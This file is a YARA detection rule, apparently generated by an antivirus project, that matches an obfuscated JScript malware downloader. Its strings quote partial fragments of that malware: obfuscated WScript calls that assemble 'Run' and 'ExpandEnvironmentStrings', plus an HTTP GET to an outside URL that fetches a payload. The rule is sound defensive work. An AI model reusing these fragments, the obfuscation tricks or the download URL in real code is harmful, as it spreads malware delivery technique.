rule sig_20160428_1c5e05ec849d6356e9120184216811f6 {
  meta:
    description = "datamaliciousorder - file 20160428_1c5e05ec849d6356e9120184216811f6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ca46dc54b73c246bd10bcfbc0b8e55de8274b8f7d72d644038a1c9f1e6ea4d65"

  strings:
    $s1  = "function AoeYokXpjUsoVzrXerWab(HgdOfoEccEspResQadTji){StoGccRwbLxkSnyZqvGxb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function UfpUssGlwQyxQgqLoaTml() {return StoGccRwbLxkSnyZqvGxb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "var StoGccRwbLxkSnyZqvGxb = function XrhQgjGwzKkjDbcWzzBcj() {return VriZcvFbwHnhSmqNsxIjo[TmyDapFreHyvDbqMhsRdt](\"WScript\"+\"" ascii
    $s4  = "return NyeWxmVlmXpeInpTqvLzs - BihQdbKvdXicOvzPcgBlo;};" fullword ascii
    $s5  = "PayDkaVpySdcChgAluKym[CtcVncQetOuoQspMeuVun](\"G\" + \"ET\", \"http://test.barbasov.ru/z0olqa\", false);" fullword ascii
    $s6  = "var StoGccRwbLxkSnyZqvGxb = function XrhQgjGwzKkjDbcWzzBcj() {return VriZcvFbwHnhSmqNsxIjo[TmyDapFreHyvDbqMhsRdt](\"WScript\"+\"" ascii
    $s7  = "var VriZcvFbwHnhSmqNsxIjo = this[\"WScript\"];" fullword ascii
    $s8  = "function UfpUssGlwQyxQgqLoaTml() {return StoGccRwbLxkSnyZqvGxb[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s9  = "function AoeYokXpjUsoVzrXerWab(HgdOfoEccEspResQadTji){StoGccRwbLxkSnyZqvGxb[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s10 = "function LzwFqsUwfJjyOzaYmrUlj(NyeWxmVlmXpeInpTqvLzs, BihQdbKvdXicOvzPcgBlo){RnrOcgOgaCrlHwjPsfLxu = RnrOcgOgaCrlHwjPsfLxu * 1; " ascii
    $s11 = "function JfiFgiNjyBwpXojTtwZic(){return EupOosIxaLujNcnQzxLnj + \"\";};" fullword ascii
    $s12 = "if (PayDkaVpySdcChgAluKym[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "var KurZbuXjeHpcIvlRarNet = false;" fullword ascii
    $s14 = "var CixCutQhoEypKihLzaPrh = new this[\"D\"+\"ate\"]();" fullword ascii
    $s15 = "DoeAcxMjlFewFivYumNyd = true; " fullword ascii
    $s16 = "function UlmBzdQnuSkfTryRppBzq()" fullword ascii
    $s17 = "function LzwFqsUwfJjyOzaYmrUlj(NyeWxmVlmXpeInpTqvLzs, BihQdbKvdXicOvzPcgBlo){RnrOcgOgaCrlHwjPsfLxu = RnrOcgOgaCrlHwjPsfLxu * 1; " ascii
    $s18 = "return LzwFqsUwfJjyOzaYmrUlj(1 == 1 ? MntTikHbbWfxYihTlfVnu : 0, 1 == 1 ? JsvTpeGrxKpaFpnNvbFtt : 0);" fullword ascii
    $s19 = "KurZbuXjeHpcIvlRarNet = true;" fullword ascii
    $s20 = "function KjnHeaSqfDjlHwjDhqPsu(){return 23;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}